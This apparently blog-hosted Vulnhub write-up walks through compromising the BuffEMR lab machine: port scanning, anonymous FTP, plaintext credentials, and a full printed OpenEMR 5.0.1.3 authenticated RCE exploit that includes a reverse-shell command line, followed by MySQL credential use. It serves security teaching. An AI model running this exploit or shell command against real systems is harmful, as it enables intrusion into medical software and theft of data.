---
title: BuffEMR (Vulnhub Writeup)
date: 2023-06-02
categories: [Writeups, Vulnhub]
tags: [FTP Anonymous Login, OpenEMR Exploitation, BufferOverflow]
---

![](/assets/img/buffemr/1.png)

Hi! Today we're going to be solving an easy machine but pretty interesting one. This is a machine from `Vulnhub`, and we're going to be learning the following contents:

- Information Leakege (FTP)
- OpenEMR (Remote Command Execution)
- Mysql database leaking information
- Buffer Overflow (Stack Based)

## Enumeration

- - -

### Target

- - - 

This is a `Vulnhub` machine, so we don't know the victim's IP yet. To find it, we are going to run an `arp` scan to the whole network:

```zsh
❯ arp-scan -I wlan0 --ignoredups --localnet
Interface: wlan0, type: EN10MB, MAC: 3c:a0:67:42:9b:ce, IPv4: 192.168.0.111
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1	ac:84:c6:d2:37:b2	TP-LINK TECHNOLOGIES CO.,LTD.
192.168.0.10	f4:4d:30:92:f9:65	Elitegroup Computer Systems Co.,Ltd.
192.168.0.112	08:00:27:ef:42:56	PCS Systemtechnik GmbH
192.168.0.109	f4:4d:30:92:f9:65	Elitegroup Computer Systems Co.,Ltd.
192.168.0.108	f6:f1:e2:2a:ff:44	(Unknown: locally administered)
192.168.0.105	a4:ca:a0:6c:8b:46	HUAWEI TECHNOLOGIES CO.,LTD
192.168.0.110	ce:32:82:b4:66:58	(Unknown: locally administered)
192.168.0.101	7c:2f:80:ed:0c:de	Gigaset Communications GmbH

30 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.075 seconds (123.37 hosts/sec). 8 responded
```

Thanks to the `OUI` (**Organization Unique Identifier**) we can deduce that the target's IP address is **192.168.0.112**.
We don't know which **OS** is running the victim machine. To find that, we are going to ping the machine, and with the `TTL` (**Time to Live**) we'll know who are we attacking: **Linux -> (TTL 64) | Windows -> (TTL 128)**

```zsh
❯ ping -c 1 192.168.0.112
PING 192.168.0.112 (192.168.0.112) 56(84) bytes of data.
64 bytes from 192.168.0.112: icmp_seq=1 ttl=64 time=0.272 ms

--- 192.168.0.112 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.272/0.272/0.272/0.000 ms
```

Great! So we can notice that the `TTL` value is **64**, so we can confirm that this is a `Linux` machine. 

### Nmap

- - - 

Now that we know the IP address and the operating system of the machine, we can start our port scan. As allways, we are going to use `nmap`:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.112 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 16:54 CEST
Initiating ARP Ping Scan at 16:54
Scanning 192.168.0.112 [1 port]
Completed ARP Ping Scan at 16:54, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:54
Scanning 192.168.0.112 [65535 ports]
Discovered open port 21/tcp on 192.168.0.112
Discovered open port 22/tcp on 192.168.0.112
Discovered open port 80/tcp on 192.168.0.112
Completed SYN Stealth Scan at 16:54, 1.15s elapsed (65535 total ports)
Nmap scan report for 192.168.0.112
Host is up, received arp-response (0.00014s latency).
Scanned at 2023-06-02 16:54:57 CEST for 1s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:EF:42:56 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Nice! We can pass this file to the `extractPorts` function:

```bash
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	batcat extractPorts.tmp
	rm extractPorts.tmp
}
```

```zsh
❯ extractPorts allPorts

    [*] Extracting information...

        [*] IP Address: 192.168.0.112
        [*] Open ports: 21,22,80

    [*] Ports copied to clipboard
```

Ok, so now we can perfomr a deeper scan of those ports!

```zsh
❯ nmap -sCV -p21,22,80 192.168.0.112 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 16:57 CEST
Nmap scan report for 192.168.0.112
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.111
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 0        0            4096 Jun 21  2021 share
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 924cae7b01fe84f95ef7f0da91e47acf (RSA)
|   256 9597ebea5cf826943ca7b6b476c3279c (ECDSA)
|_  256 cb1cd9564f7ac00125cd98f64e232e77 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 08:00:27:EF:42:56 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
```

In this scan we can see all the services of each port open. 

- Port 80 -> Web Services (HTTP)
- Port 22 -> SSH Services (Simple Shell)
- Port 21 -> FTP Services (File Transfer Protocol)

## Foothold

- - - 

When accessing the web we can notice that is the default `Apache` server:

![](/assets/img/buffemr/2.png)

By the other hand, in the `nmap` scan we saw that **Anonymous** login was enabled, so let's connect and check some things!

```zsh
❯ ftp 192.168.0.112
Connected to 192.168.0.112.
220 (vsFTPd 3.0.3)
Name (192.168.0.112:ruy): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||19209|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jun 21  2021 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||41688|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              20 Jun 21  2021 README
drwxr-xr-x   31 0        0            4096 Jun 21  2021 openemr
226 Directory send OK.
ftp> cd openemr
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||32726|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            5526 Jun 21  2021 CODE_OF_CONDUCT.md
-rw-r--r--    1 0        0            2876 Jun 21  2021 CONTRIBUTING.md
drwxr-xr-x    4 0        0            4096 Jun 21  2021 Documentation
-rw-r--r--    1 0        0           35147 Jun 21  2021 LICENSE
-rw-r--r--    1 0        0            3356 Jun 21  2021 README.md
-rw-r--r--    1 0        0           20701 Jun 21  2021 acknowledge_license_cert.html
-rw-r--r--    1 0        0           19560 Jun 21  2021 acl_setup.php
-rw-r--r--    1 0        0           48330 Jun 21  2021 acl_upgrade.php
-rw-r--r--    1 0        0            4988 Jun 21  2021 admin.php
-rw-r--r--    1 0        0            3805 Jun 21  2021 bower.json
-rw-r--r--    1 0        0            6102 Jun 21  2021 build.xml
drwxr-xr-x    2 0        0            4096 Jun 21  2021 ccdaservice
drwxr-xr-x    4 0        0            4096 Jun 21  2021 ccr
drwxr-xr-x    2 0        0            4096 Jun 21  2021 ci
drwxr-xr-x    2 0        0            4096 Jun 21  2021 cloud
drwxr-xr-x    7 0        0            4096 Jun 21  2021 common
-rw-r--r--    1 0        0            3301 Jun 21  2021 composer.json
-rw-r--r--    1 0        0          265675 Jun 21  2021 composer.lock
drwxr-xr-x    2 0        0            4096 Jun 21  2021 config
drwxr-xr-x   11 0        0            4096 Jun 21  2021 contrib
-rw-r--r--    1 0        0             108 Jun 21  2021 controller.php
drwxr-xr-x    2 0        0            4096 Jun 21  2021 controllers
drwxr-xr-x    2 0        0            4096 Jun 21  2021 custom
-rwxr-xr-x    1 0        0            3995 Jun 21  2021 docker-compose.yml
drwxr-xr-x    2 0        0            4096 Jun 21  2021 entities
drwxr-xr-x    8 0        0            4096 Jun 21  2021 gacl
drwxr-xr-x    2 0        0            4096 Jun 21  2021 images
-rw-r--r--    1 0        0             901 Jun 21  2021 index.php
drwxr-xr-x   32 0        0            4096 Jun 21  2021 interface
-rw-r--r--    1 0        0            5381 Jun 21  2021 ippf_upgrade.php
drwxr-xr-x   25 0        0            4096 Jun 21  2021 library
drwxr-xr-x    3 0        0            4096 Jun 21  2021 modules
drwxr-xr-x    3 0        0            4096 Jun 21  2021 myportal
drwxr-xr-x    4 0        0            4096 Jun 21  2021 patients
drwxr-xr-x    6 0        0            4096 Jun 21  2021 phpfhir
drwxr-xr-x   10 0        0            4096 Jun 21  2021 portal
drwxr-xr-x    5 0        0            4096 Jun 21  2021 public
drwxr-xr-x    2 0        0            4096 Jun 21  2021 repositories
drwxr-xr-x    2 0        0            4096 Jun 21  2021 services
-rw-r--r--    1 0        0           40570 Jun 21  2021 setup.php
drwxr-xr-x    3 0        0            4096 Jun 21  2021 sites
drwxr-xr-x    2 0        0            4096 Jun 21  2021 sql
-rw-r--r--    1 0        0            4650 Jun 21  2021 sql_patch.php
-rw-r--r--    1 0        0            5375 Jun 21  2021 sql_upgrade.php
drwxr-xr-x   15 0        0            4096 Jun 21  2021 templates
drwxr-xr-x    5 0        0            4096 Jun 21  2021 tests
drwxr-xr-x   34 0        0            4096 Jun 21  2021 vendor
-rw-r--r--    1 0        0            2119 Jun 21  2021 version.php
226 Directory send OK.
ftp> 
```

Here we can see an [openemr](https://www.open-emr.org/) folder. Its pretty anoying to be enumerating all the files by `FTP`, so we can bring all the resources to our machine with `wget`:

```zsh
❯ wget -r ftp://192.168.0.112
--2023-06-02 17:05:57--  ftp://192.168.0.112/
           => «192.168.0.112/.listing»
Conectando con 192.168.0.112:21... conectado.
Identificándose como anonymous ... ¡Dentro!
```

**Truncated**

Perfect! Now we can check all the **interesting** files:

![](/assets/img/buffemr/3.png)

The `tests` folder seems interesting, so let's move to that directory and check its content:

```zsh
❯ ls
certification  e2e  README.md  test.accounts  unit
                                                                                                                              
❯ cat test.accounts
this is a test admin account:
admin:Monster123
```

HAHAHAH! This is common on `Vulnhub` machines, find credentials on clear text! Let's login to `openmr`:

![](/assets/img/buffemr/4.png)

## Gaining access (www-data)

- - - 

After looking at the web, we can notice in the `About` tab that this `openemr` is **5.0.1 (3)**:

![](/assets/img/buffemr/5.png)

We know the service's version, so se can search an exploit:

```zsh
❯ searchsploit openemr 5.0.1
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1 - 'controller' Remote Code Execution                                                                                                                                            | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                                                                                                                                                     | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                                                                                                                                     | php/webapps/49486.rb
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                                                                                                                   | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                                                                                                               | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                                                                                                      | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                                                                                                                       | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                                                                                                       | php/webapps/45161.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                                                                                                                                   | php/webapps/50037.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)                                                                                                                               | php/webapps/50087.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                
❯ searchsploit -m php/webapps/45161.py
  Exploit: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/45161
     Path: /usr/share/exploitdb/exploits/php/webapps/45161.py
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /home/ruy/Escritorio/Vulnhub/Machines/BuffEMR/exploits/45161.py
                                                              
❯ mv 45161.py openemr_exploit.py
```

Great! Let's check this exploit code:

```python
# Title: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
# Author: Cody Zacharias
# Date: 2018-08-07
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz
# Dockerfile: https://github.com/haccer/exploits/blob/master/OpenEMR-RCE/Dockerfile
# Version: < 5.0.1 (Patch 4)
# Tested on: Ubuntu LAMP, OpenEMR Version 5.0.1.3
# References:
# https://www.youtube.com/watch?v=DJSQ8Pk_7hc
'''
WARNING: This proof-of-concept exploit WILL replace the GLOBAL config.
If you don't want the OpenEMR config to be reset to default, please modify
the payload.

Example Usage:
- python openemr_rce.py http://127.0.0.1/openemr-5_0_1_3 -u admin -p admin -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'
'''

#!/usr/bin/env python

import argparse
import base64
import requests
import sys

ap = argparse.ArgumentParser(description="OpenEMR RCE")
ap.add_argument("host", help="Path to OpenEMR (Example: http://127.0.0.1/openemr).")
ap.add_argument("-u", "--user", help="Admin username")
ap.add_argument("-p", "--password", help="Admin password")
ap.add_argument("-c", "--cmd", help="Command to run.")
args = ap.parse_args()

ascii = "> .---.  ,---.  ,---.  .-. .-.,---.          ,---.    <\r\n"
ascii+= ">/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   <\r\n"
ascii+= ">| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   <\r\n"
ascii+= ">| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    <\r\n"
ascii+= ">\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   <\r\n"
ascii+= "> )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  <\r\n"
ascii+= ">(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) <\r\n"
ascii+= "                                                       \r\n"
ascii+= "   ={>   P R O J E C T    I N S E C U R I T Y   <}=    \r\n"
ascii+= "                                                       \r\n"
ascii+= "         Twitter : >@Insecurity<                       \r\n"
ascii+= "         Site    : >insecurity.sh<                     \r\n"

green = "\033[1;32m"
red = "\033[1;31m"
clear = "\033[0m"

load = "[>$<] ".replace(">", green).replace("<", clear)
err = "[>-<] ".replace(">", red).replace("<", clear)
intro = ascii.replace(">", green).replace("<", clear)

print(intro)

with requests.session() as s:
    login = {"new_login_session_management": "1",
            "authProvider": "Default",
            "authUser": args.user,
            "clearPass": args.password,
            "languageChoice": "1"
            }

    print(load + "Authenticating with " + args.user + ":" + args.password)
    r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=default", data=login)
    if "login_screen.php?error=1&site=" in r.text:
        print(err + "Failed to Login.")
        sys.exit(0)

    # This will rewrite and replace your current GLOBALS, please modify this if you don't want that.
    payload = "form_save=Save&srch_desc=&form_0=main_info.php&form_1=..%2F..%2Finterface"
    payload += "%2Fmain%2Fmessages%2Fmessages.php%3Fform_active%3D1&form_2=1&form_3=tabs_"
    payload += "style_full.css&form_4=style_light.css&form_5=__default__&form_6=__default"
    payload += "__&form_7=1&form_8=0&form_9=175&form_10=OpenEMR&form_12=1&form_13=0&form_"
    payload += "14=0&form_16=1&form_21=1&form_22=1&form_23=1&form_24=1&form_25=http%3A%2F"
    payload += "%2Fopen-emr.org%2F&form_26=&form_27=20&form_28=10&form_30=0&form_31=5&for"
    payload += "m_32=0&form_37=English+%28Standard%29&form_38=1&form_42=1&form_43=1&form_"
    payload += "44=1&form_45=1&form_46=1&form_47=1&form_48=1&form_49=1&form_50=1&form_51="
    payload += "0&form_52=0&form_53=&form_54=2&form_55=.&form_56=%2C&form_57=%24&form_58="
    payload += "0&form_59=3&form_60=6%2C0&form_61=0&form_62=0&form_63=_blank&form_69=1&fo"
    payload += "rm_70=1&form_77=1&form_79=&form_80=&form_81=&form_84=1&form_85=1&form_87="
    payload += "1&form_89=1&form_90=1&form_91=1&form_92=Y1&form_93=1&form_94=2&form_95=0&"
    payload += "form_97=14&form_98=11&form_99=24&form_100=20&form_102=1&form_103=0&form_1"
    payload += "04=0&form_105=ICD10&form_106=1&form_107=1&form_112=3&form_115=1&form_116="
    payload += "&form_119=1.00&form_121=0&form_123=&form_125=30&form_126=&form_127=60&for"
    payload += "m_128=&form_129=90&form_130=&form_131=120&form_132=&form_133=150&form_134"
    payload += "=&form_135=1&form_138=1&form_139=1&form_141=1&form_142=0&form_143=localho"
    payload += "st&form_144=&form_145=&form_146=5984&form_147=&form_150=Patient+ID+card&f"
    payload += "orm_151=Patient+Photograph&form_152=Lab+Report&form_153=Lab+Report&form_1"
    payload += "55=100&form_157=8&form_158=17&form_159=15&form_160=day&form_161=1&form_16"
    payload += "2=2&form_163=1&form_164=10&form_165=10&form_166=15&form_167=20&form_168=1"
    payload += "&form_169=%23FFFFFF&form_170=%23E6E6FF&form_171=%23E6FFE6&form_172=%23FFE"
    payload += "6FF&form_173=1&form_174=0&form_176=1&form_177=1&form_178=1&form_181=1&for"
    payload += "m_182=1&form_183=1&form_184=1&form_185=D0&form_186=D0&form_187=0%3A20&for"
    payload += "m_188=0&form_190=33&form_191=0&form_194=7200&form_198=1&form_199=0&form_2"
    payload += "00=0&form_202=&form_203=&form_204=365&form_205=&form_206=1&form_208=&form"
    payload += "_210=&form_211=&form_212=&form_213=&form_214=&form_215=&form_216=SMTP&for"
    payload += "m_217=localhost&form_218=25&form_219=&form_220=&form_221=&form_222=50&for"
    payload += "m_223=50&form_224=&form_225=&form_226=&form_227=50&form_228=&form_229=&fo"
    payload += "rm_230=&form_231=1&form_232=1&form_233=1&form_234=1&form_235=1&form_236=1"
    payload += "&form_237=1&form_238=1&form_239=Model+Registry&form_240=125789123&form_24"
    payload += "1=1&form_242=1&form_243=1&form_244=&form_245=&form_246=1&form_247=1&form_"
    payload += "248=1&form_249=5&form_250=1&form_252=1&form_253=1&form_254=1&form_255=1&f"
    payload += "orm_256=1&form_257=1&form_258=1&form_262=&form_263=6514&form_264=&form_26"
    payload += "5=&form_267=1&form_268=0&form_269=%2Fusr%2Fbin&form_270=%2Fusr%2Fbin&form"
    payload += "_271=%2Ftmp&form_272=%2Ftmp&form_273=26&form_274=state&form_275=1&form_27"
    payload += "6=26&form_277=country&form_278=lpr+-P+HPLaserjet6P+-o+cpi%3D10+-o+lpi%3D6"
    payload += "+-o+page-left%3D72+-o+page-top%3D72&form_279=&form_280=&form_282=2018-07-"
    payload += "23&form_283=1&form_285=%2Fvar%2Fspool%2Fhylafax&form_286=enscript+-M+Lett"
    payload += "er+-B+-e%5E+--margins%3D36%3A36%3A36%3A36&form_288=%2Fmnt%2Fscan_docs&for"
    payload += "m_290=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fportal&form_292=1&form_"
    payload += "296=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fpatients&form_297=1&form_"
    payload += "299=&form_300=&form_301=&form_302=https%3A%2F%2Fssh.mydocsportal.com%2Fpr"
    payload += "ovider.php&form_303=https%3A%2F%2Fssh.mydocsportal.com&form_305=https%3A%"
    payload += "2F%2Fyour_cms_site.com%2F&form_306=&form_307=&form_308=0&form_309=https%3"
    payload += "A%2F%2Fhapi.fhir.org%2FbaseDstu3%2F&form_312=https%3A%2F%2Fsecure.newcrop"
    payload += "accounts.com%2FInterfaceV7%2FRxEntry.aspx&form_313=https%3A%2F%2Fsecure.n"
    payload += "ewcropaccounts.com%2Fv7%2FWebServices%2FUpdate1.asmx%3FWSDL%3Bhttps%3A%2F"
    payload += "%2Fsecure.newcropaccounts.com%2Fv7%2FWebServices%2FPatient.asmx%3FWSDL&fo"
    payload += "rm_314=21600&form_315=21600&form_316=&form_317=&form_318=&form_319=1&form"
    payload += "_324=&form_325=0&form_327=137&form_328=7C84773D5063B20BC9E41636A091C6F17E"
    payload += "9C1E34&form_329=C36275&form_330=0&form_332=https%3A%2F%2Fphimail.example."
    payload += "com%3A32541&form_333=&form_334=&form_335=admin&form_336=5&form_339=1&form"
    payload += "_346=LETTER&form_347=30&form_348=30&form_349=72&form_350=30&form_351=P&fo"
    payload += "rm_352=en&form_353=LETTER&form_354=5&form_355=5&form_356=5&form_357=8&for"
    payload += "m_358=D&form_359=1&form_360=9&form_361=1&form_362=104.775&form_363=241.3&"
    payload += "form_364=14&form_365=65&form_366=220"

    p = {}
    for c in payload.replace("&", "\n").splitlines():
        a = c.split("=")
        p.update({a[0]: a[1]})

    # Linux only, but can be easily modified for Windows.
    _cmd = "|| echo " + base64.b64encode(args.cmd) + "|base64 -d|bash"
    p.update({"form_284": _cmd})

    print(load + "Injecting payload")
    s.post(args.host + "/interface/super/edit_globals.php", data=p)
    sp = s.get(args.host + "/interface/main/daemon_frame.php") # M4tt D4em0n w0z h3r3 ;PpPpp
    if sp.status_code == 200:
        print(load + "Payload executed")
```

Ok, this seems a `Mass Assignment Attack`, because its entering a lot of info in the parameters on `/edit_globals.php`:

![](/assets/img/buffemr/6.png)

So I suppose that one of these parameters is beeing executed at system-level, and by concatenating and **or** (||) it creates a conflict and we are able to execute commands on the machine. Let's try this exploit!

![](/assets/img/buffemr/7.png)

All right! We are able to execute commands on the machine! Let's gain a reverse shell:

![](/assets/img/buffemr/8.png)

NICE!!! 

## Getting user **buffemr** by leaking database information

- - - 

As `www-data` we don't have **any** privilege or file to read, but remember the files from `FTP`? Well, we can find some interesting information:

```zsh
❯ find \-name \*conf\*
./openemr/library/sqlconf.php
./openemr/library/js/nncustom_config.js
./openemr/portal/patient/_machine_config.php
./openemr/portal/patient/_global_config.php
./openemr/portal/patient/_app_config.php
./openemr/config
./openemr/config/config.yaml
./openemr/Documentation/privileged_db/secure_sqlconf.php
./openemr/interface/weno/confirm.php
./openemr/sites/default/config.php
./openemr/sites/default/sqlconf.php
./openemr/.editorconfig
```

Nice, here we see an **sqlconf.php** file. Let's check its content:

![](/assets/img/buffemr/9.png)

This give us a hint that some `mysql` database is running. We have a username and a password, so let's connect to the database!

```zsh
www-data@buffemr:/var$ mysql -h localhost -P 3306 -u openemruser -popenemruser123456
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 5.7.42-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| openemr            |
| user_info          |
+--------------------+
3 rows in set (0.00 sec)

mysql> use user_info
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_user_info |
+---------------------+
| ENCKEYS             |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from ENCKEYS;
+------+--------+----------------------+
| id   | name   | ENC                  |
+------+--------+----------------------+
|    1 | pdfkey | c2FuM25jcnlwdDNkCg== |
+------+--------+----------------------+
1 row in set (0.00 sec)

mysql> 
```

Ok, we can see a `base64` string, that seems to be a key for a `PDF` file. We could search for `PDFs` files in the system:

```zsh
www-data@buffemr:/var$ find / \-name *.pdf
/var/www/html/openemr/public/assets/modernizr-3-5-0/media/Modernizr 2 Logo.pdf
/var/www/html/openemr/vendor/rospdf/pdf-php/readme.pdf
/var/www/html/openemr/gacl/docs/manual.pdf
/var/www/html/openemr/gacl/docs/translations/russian/manual_rus.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 2-1-0 Updating client profile Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 2-4-0 Updating clinic issues data Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-4-0 Managing Inventory _Products_ Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 2-5-0 Updating clinic checks data Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-5-2 Laboratory Orders and Results Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-0-0 Summary Guide of Administrative Processes Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 3-1-0 Define Provider  Appt Schedules Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 5-3-0 Generating aggregated reports in eIMS Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 5-1-0 Generating an export file in OpenEMR Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-1-1 Creating a non-duplicate new OpenEMR record Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-6-0 Completing Checkout - Closing visit cycle Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 9-0-0 Pentaho - XML Implementation Ver 4-1.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-0-0 Summary Guide of Visit Cycle Processes Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-2-1 Advanced search for an existing OpenEMR record Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 5-2-0 Importing an OpenEMR file into eIMS Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 6-5-0 Layouts Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-7-0 EOD Procedures Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-3-0 Managing Services Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 6-1-0 Global Settings Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 3-3-0 Completing Client Appointments Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 2-3-0 Updating clinic form data Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-3-0 Creating a new visit Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 2-0-0 Summary Guide of Updating Processes Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-2-0 Finding an existing OpenEMR records Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-4-2 Enhanced Inventory Lot Features Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-1-0 Managing Pre-Payments Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-5-0 Completing an e-Tally Sheet Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-1-0 Creating a new OpenEMR record Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-5-1 Laboratory Catalogue Configuration Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 5-0-0 Summary Guide of Integration with External Systems Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 3-2-0 Create new appointment Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 2-2-0 Updating clinic history data Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-2-0 Managing Referrals Ver 4-1.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 1-4-0 Printing a Paper Tally Sheet Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 6-0-0 Summary Guide of Customization Functions Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process Guidelines Outline -June 2010.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-4-1 Creating a Service Package Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 9-1-0 Pentaho basic concepts - tools - definitions Ver 4-1.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 4-5-0 Diagnostic Laboratories & Orders Ver 4-0.pdf
/var/www/html/openemr/Documentation/IPPF_Guides/Process 3-0-0 Summary Guide of Managing Appointments Ver 4-0.pdf
/var/www/html/openemr/Documentation/Payment_Posting_ZHH.pdf
/var/www/html/openemr/Documentation/Using The End of Day Report in OpenEmr.pdf
/var/www/html/openemr/Documentation/Clinical_Decision_Rules_Manual.pdf
/var/www/html/openemr/Documentation/Complete_Vaccine_Listing.pdf
/var/www/html/openemr/Documentation/Setting up the Patient flow board for OpenEmr.pdf
/srv/ftp/share/openemr/public/assets/modernizr-3-5-0/media/Modernizr 2 Logo.pdf
